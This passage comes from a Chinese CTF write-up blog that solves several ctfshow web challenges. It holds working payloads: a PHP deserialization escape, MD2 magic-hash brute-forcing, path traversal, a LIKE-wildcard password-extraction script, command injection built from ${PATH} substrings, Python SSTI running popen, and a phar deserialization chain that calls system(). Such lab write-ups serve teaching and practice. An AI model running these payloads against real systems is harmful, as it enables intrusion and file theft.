	&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#x27;Firebasky&#x27;,&#x27;Firebaskyup&#x27;,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[1];</span><br><span class="line">$password=1;</span><br><span class="line">$ser=filter(serialize(new a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br></pre></td></tr></table></figure>

<p>一眼丁真，变长度反序列化绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web2-故人心"><a href="#web2-故人心" class="headerlink" title="web2_故人心"></a>web2_故人心</h2><p>hint</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Is it particularly difficult to break MD2?!</span><br><span class="line">I&#x27;ll tell you quietly that I saw the payoad of the author.</span><br><span class="line">But the numbers are not clear.have fun~~~~</span><br><span class="line">xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">$c=$_GET[&#x27;c&#x27;];</span><br><span class="line">$url[1]=$_POST[&#x27;url&#x27;];</span><br><span class="line">if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0)&#123;</span><br><span class="line">    $d = ($b==hash(&quot;md2&quot;, $b)) &amp;&amp; ($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c)));</span><br><span class="line">    if($d)&#123;</span><br><span class="line">             highlight_file(&#x27;hint.php&#x27;);</span><br><span class="line">             if(filter_var($url[1],FILTER_VALIDATE_URL))&#123;</span><br><span class="line">                $host=parse_url($url[1]);</span><br><span class="line">                print_r($host); </span><br><span class="line">                if(preg_match(&#x27;/ctfshow\.com$/&#x27;,$host[&#x27;host&#x27;]))&#123;</span><br><span class="line">                    print_r(file_get_contents($url[1]));</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    echo &#x27;差点点就成功了！&#x27;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &#x27;please give me url!!!&#x27;;</span><br><span class="line">            &#125;     </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;想一想md5碰撞原理吧?!&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;第一个都过不了还想要flag呀?!&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求<code>$a</code>是数字，长度小于7，非零且平方运算等于零</p>
<p>可以猜测大概是使用科学计数法来打</p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/19779806/minimum-evaluatable-scientific-value">Minimum evaluatable scientific value?</a></p>
<p>由于php中双精度存储的限制，<code>1E-323</code>会以<code>float(9.8813129168249E-323)</code>的形式存储，当下探一位到<code>1E-324</code>时，精度不满足就到了<code>float(0)</code></p>
<p>所以只要令<code>$a=1E-162</code>即可</p>
<p>md2注意到hint内容，联想到md5的弱类型比较，肯定是要<code>0exxxxx == 0exxxx</code>的类型</p>
<p>这个hint给的也💩，实际上应该是这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$b = xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">$c = xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$c))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Hash import MD2</span><br><span class="line"></span><br><span class="line">b = &quot;024452&quot;</span><br><span class="line">c = &quot;48399&quot;</span><br><span class="line">num = &quot;0123456789&quot;</span><br><span class="line">for i in num:</span><br><span class="line">    for j in num:</span><br><span class="line">        for k in num:</span><br><span class="line">            for q in num:</span><br><span class="line">                payload2 = &quot;0e&quot; + i + j + k + q + c</span><br><span class="line">                md2_hash_2 = MD2.new(payload2.encode()).hexdigest()</span><br><span class="line">                md2_hash_3 = MD2.new(md2_hash_2.encode()).hexdigest()</span><br><span class="line">                if md2_hash_3[:2] == &#x27;0e&#x27; and md2_hash_3[2:].isdigit():</span><br><span class="line">                    print(&quot;2:&quot; + payload2)</span><br><span class="line">            payload1 = &quot;0e&quot; + i + j + k + b</span><br><span class="line">            md2_hash_1 = MD2.new(payload1.encode()).hexdigest()</span><br><span class="line">            if md2_hash_1[:2] == &#x27;0e&#x27; and md2_hash_1[2:].isdigit():</span><br><span class="line">                print(&quot;1:&quot; + payload1)</span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line">2:0e603448399</span><br><span class="line">1:0e652024452</span><br></pre></td></tr></table></figure>

<p>第三步提示<code>flag in /fl0g.txt</code>，要求传入能过URL筛选器的字符</p>
<p><code>file_get_contents</code>有个点就是，当传入的伪协议头未知时，当做文件夹操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=httpt://ctfshow.com/../../../../../../../../fl0g.txt</span><br><span class="line">http变为httpt这个未知协议</span><br></pre></td></tr></table></figure>

<h2 id="web3-莫负婵娟"><a href="#web3-莫负婵娟" class="headerlink" title="web3_莫负婵娟"></a>web3_莫负婵娟</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- username yu22x --&gt;</span><br><span class="line">&lt;!-- SELECT * FROM users where username like binary(&#x27;$username&#x27;) and password like binary(&#x27;$password&#x27;)--&gt;</span><br></pre></td></tr></table></figure>

<p>fuzz一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;%&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;\\&#x27;, &#x27;^&#x27;, &#x27;select&#x27;, &#x27;union&#x27;, &#x27;sleep&#x27;]</span><br></pre></td></tr></table></figure>

<p>单双引号和反斜杠都被过滤了，肯定绕不过了</p>
<p>由于这里用的特殊匹配方法<code>like</code></p>
<blockquote>
<p>like有两个模式：_和%</p>
<p>_：表示单个字符，用来查询定长的数据</p>
<p>%：表示0个或多个任意字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;（1）SELECT * FROM Persons  WHERE City LIKE &#x27;N%&#x27;     &quot;Persons&quot; 表中选取居住在以 &quot;N&quot; 开始的城市里的人</span><br><span class="line">&gt;（2）SELECT * FROM Persons  WHERE City LIKE &#x27;%g&#x27;     &quot;Persons&quot; 表中选取居住在以 &quot;g&quot; 结尾的城市里的人</span><br><span class="line">&gt;（3）SELECT * FROM Persons   WHERE City LIKE &#x27;%lon%&#x27;  从 &quot;Persons&quot; 表中选取居住在包含 &quot;lon&quot; 的城市里的人</span><br><span class="line">&gt;（4）SELECT * FROM Persons   WHERE City NOT LIKE &#x27;%lon%&#x27;  从 &quot;Persons&quot; 表中选取居住在不包含 &quot;lon&quot; 的城市里的人</span><br></pre></td></tr></table></figure>
</blockquote>
<p>往<code>password</code>里塞32个<code>_</code>，能模糊匹配，打出回显：<code>I have filtered all the characters. Why can you come in? get out!</code></p>
<p>跑个脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://10e8ff00-4077-42a3-9cbc-b9b6fe7ff911.challenge.ctf.show/login.php&quot;</span><br><span class="line">length = 32</span><br><span class="line">tables = string.printable</span><br><span class="line">password = &quot;&quot;</span><br><span class="line">for i in range(length):</span><br><span class="line">    for table in tables:</span><br><span class="line">        payload = password + table + &quot;_&quot; * (length - i - 1)</span><br><span class="line">        r = requests.post(url, data=&#123;</span><br><span class="line">            &quot;username&quot;: &quot;yu22x&quot;,</span><br><span class="line">            &quot;password&quot;: payload</span><br><span class="line">        &#125;)</span><br><span class="line">        if &quot;wrong username or password&quot; not in r.text:</span><br><span class="line">            password = password + table</span><br><span class="line">            print(password)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>进去是个ip测试，自己起个发现是使用<code>curl</code></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402162309199.png" alt="image-20240216230905126"></p>
<p>fuzz一下过滤了全部小写字母</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;/&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;[&#x27;, &#x27;\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;`&#x27;, &#x27;|&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;]</span><br></pre></td></tr></table></figure>

<p>剩下可用的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;.&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;_&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;, &#x27; &#x27;, &#x27;\r&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;]</span><br></pre></td></tr></table></figure>

<p>hint</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">环境变量 +linux字符串截取 + 通配符</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/04/14/ctf%e9%87%8c%e8%af%bb%e5%8f%96%e6%96%87%e4%bb%b6%e7%9b%b8%e5%85%b3%e7%9f%a5%e8%af%86%e7%82%b9%e6%80%bb%e7%bb%93/">ctf里读取文件相关知识点总结</a></p>
<p>里面提到过空格&#x2F;被过滤可以使用<code>$&#123;PATH:0:1&#125;</code>来代替，同理，我们要执行的也可以用这个来代替</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402162327228.png" alt="image-20240216232730176"></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402162329210.png" alt="image-20240216232913174"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;-&gt;ls</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;$&#123;PATH:14:1&#125;$&#123;PATH:5:1&#125; ????.???-&gt;nl ????.???</span><br></pre></td></tr></table></figure>

<h2 id="1024-WEB签到"><a href="#1024-WEB签到" class="headerlink" title="1024_WEB签到"></a>1024_WEB签到</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">call_user_func($_GET[&#x27;f&#x27;]);</span><br></pre></td></tr></table></figure>

<p>可见是没有参数能传入的，也没法无参rce</p>
<p>直接去phpinfo找</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402181626490.png" alt="image-20240218162630417"></p>
<p>调用就行</p>
<h2 id="1024-fastapi"><a href="#1024-fastapi" class="headerlink" title="1024_fastapi"></a>1024_fastapi</h2><p>fastapi，dirsearch扫出手册<code>/docs</code></p>
<p>由python写出来的后端，尝试有回显的函数<code>str(123)</code>返回<code>123</code></p>
<p>尝试ssti</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6885">Python模板注入(SSTI)深入学习</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=str(&quot;&quot;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;cat /mnt/f1a9&#x27;).read())</span><br></pre></td></tr></table></figure>

<p>先读源码<code>main.py</code>，提示flag位置，还ban了一些</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;import&#x27;,&#x27;open&#x27;,&#x27;eval&#x27;,&#x27;exec&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="1024-柏拉图"><a href="#1024-柏拉图" class="headerlink" title="1024_柏拉图"></a>1024_柏拉图</h2><p>首页要求输入url，试了<code>http</code>协议报错，试到<code>file</code>协议不报错，后面是双写绕过</p>
<p>读一下源文件</p>
<p>index.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-10-19 20:09:22</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-10-19 21:31:48</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line">function curl($url)&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    echo curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = $_GET[&#x27;url&#x27;];</span><br><span class="line">    $bad = &#x27;file://&#x27;;</span><br><span class="line">    if(preg_match(&#x27;/dict|127|localhost|sftp|Gopherus|http|\.\.\/|flag|[0-9]/is&#x27;, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			die(&#x27;难道我不知道你在想什么？除非绕过我？！&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      $url=str_replace($bad,&quot;&quot;,$url);</span><br><span class="line">      curl($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">if (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123;</span><br><span class="line"></span><br><span class="line">    if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;</span><br><span class="line">      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; 文件已经存在啦！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">      echo &quot;文件存储在: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">      echo &quot;这个文件我不喜欢，我喜欢一个gif的文件&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>readfile.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#x27;class.php&#x27;);</span><br><span class="line">function check($filename)&#123;  </span><br><span class="line">    if (preg_match(&quot;/^phar|^smtp|^dict|^zip|file|etc|root|filter|\.\.\//i&quot;,$filename))&#123;</span><br><span class="line">        die(&quot;姿势太简单啦，来一点骚的？！&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;filename&#x27;]))&#123;</span><br><span class="line">    $file=$_GET[&#x27;filename&#x27;];</span><br><span class="line">        if(strstr($file, &quot;flag&quot;) || check($file) || strstr($file, &quot;php&quot;)) &#123;</span><br><span class="line">            die(&quot;这么简单的获得不可能吧？！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        echo readfile($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class A &#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public function __construct($a)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a = $a;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;THI IS CTFSHOW&quot;.$this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B &#123;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct($b)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;b = $b;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return ($this-&gt;b)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C&#123;</span><br><span class="line">    public $c;</span><br><span class="line">    public function __construct($c)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;c = $c;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        return eval($this-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>unlink.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file=$_GET[&#x27;filename&#x27;];</span><br><span class="line">function check($file)&#123;  </span><br><span class="line">  if (preg_match(&quot;/\.\.\//i&quot;,$file))&#123;</span><br><span class="line">      die(&quot;你想干什么？！&quot;);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">      return $file;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(file_exists(&quot;upload/&quot;.$file))&#123;</span><br><span class="line">      if(unlink(&quot;upload/&quot;.check($file)))&#123;</span><br><span class="line">          echo &quot;删除&quot;.$file.&quot;成功！&quot;;</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">          echo &quot;删除&quot;.$file.&quot;失败！&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;要删除的文件不存在！&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>看到有个<code>class.php</code>和<code>readfile</code>函数，一眼phar反序列化</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6699">php反序列化拓展攻击详解–phar</a></p>
<p>poc.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">    public $a;</span><br><span class="line">//    public function __construct($a)</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;a = $a;</span><br><span class="line">//    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;THI IS CTFSHOW&quot;.$this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B &#123;</span><br><span class="line">    public $b;</span><br><span class="line">//    public function __construct($b)</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;b = $b;</span><br><span class="line">//    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return ($this-&gt;b)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C&#123;</span><br><span class="line">    public $c;</span><br><span class="line">//    public function __construct($c)</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;c = $c;</span><br><span class="line">//    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        return eval($this-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$A = new A(&#x27;&#x27;);</span><br><span class="line">$B = new B(&#x27;&#x27;);</span><br><span class="line">$C = new C(&#x27;&#x27;);</span><br><span class="line">$A-&gt;a = $B;</span><br><span class="line">$B-&gt;b = $C;</span><br><span class="line">$C-&gt;c = &#x27;system(&quot;cat /ctfshow_1024_flag.txt&quot;);&#x27;;</span><br><span class="line">$phar = new Phar(&#x27;cat.phar&#x27;);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);</span><br><span class="line">$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);</span><br><span class="line">$phar -&gt; setMetadata($A);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>

<p>上传直接用<code>compress.zlib://phar://</code>读</p>
<h2 id="1024-图片代理"><a href="#1024-图片代理" class="headerlink" title="1024_图片代理"></a>1024_图片代理</h2><p>自动跳转</p>
